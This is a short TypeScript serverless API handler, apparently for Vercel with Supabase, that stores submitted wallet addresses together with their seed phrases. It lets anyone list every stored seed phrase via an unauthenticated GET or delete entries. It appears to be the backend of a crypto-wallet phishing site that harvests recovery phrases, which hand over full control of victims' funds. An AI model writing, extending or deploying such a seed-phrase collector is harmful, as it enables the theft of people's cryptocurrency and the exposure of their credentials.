import { VercelRequest, VercelResponse } from '@vercel/node';
import { createClient } from '@supabase/supabase-js';

const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_SERVICE_ROLE_KEY;

if (!supabaseUrl || !supabaseKey) {
  console.warn('Missing SUPABASE_URL or SUPABASE_SERVICE_ROLE_KEY');
}

const supabase = createClient(supabaseUrl || '', supabaseKey || '');

export default async function handler(req: VercelRequest, res: VercelResponse) {
  if (req.method === 'GET') {
    const { data, error } = await supabase
      .from('submissions')
      .select('id,wallet,seedPhrase,timestamp')
      .order('timestamp', { ascending: false });

    if (error) return res.status(500).json({ error: error.message });
    return res.status(200).json(data);
  }

  if (req.method === 'POST') {
    const { wallet, seedPhrase, timestamp } = req.body;
    if (!wallet || !seedPhrase || !timestamp) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    const { data, error } = await supabase.from('submissions').insert([{ wallet, seedPhrase, timestamp }]);

    if (error) return res.status(500).json({ error: error.message });
    return res.status(201).json(data?.[0]);
  }

  if (req.method === 'DELETE') {
    const id = req.query.id;
    if (!id) return res.status(400).json({ error: 'id required' });

    const { error } = await supabase.from('submissions').delete().eq('id', Number(id));
    if (error) return res.status(500).json({ error: error.message });

    return res.status(204).end();
  }

  res.status(405).json({ error: 'Method not allowed' });
}
